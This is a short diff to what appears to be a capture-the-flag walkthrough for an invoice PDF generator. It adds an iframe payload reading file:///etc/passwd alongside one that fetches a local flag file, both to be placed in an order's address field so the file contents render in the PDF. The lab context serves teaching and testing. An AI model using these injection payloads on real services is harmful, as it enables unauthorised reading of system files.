@@ -75,6 +75,10 @@ Place a second order with the following tag in any address field:
 <iframe src="http://127.0.0.1:8001/flag.txt" width="500" height="500"></iframe>
 ```
 
+```
+<iframe src="file:///etc/passwd" width="500" height="500"></iframe>
+```
+
 Download the PDF invoice.  The **Shipping Address** section will contain the
 flag printed inline in **red monospace**:
 
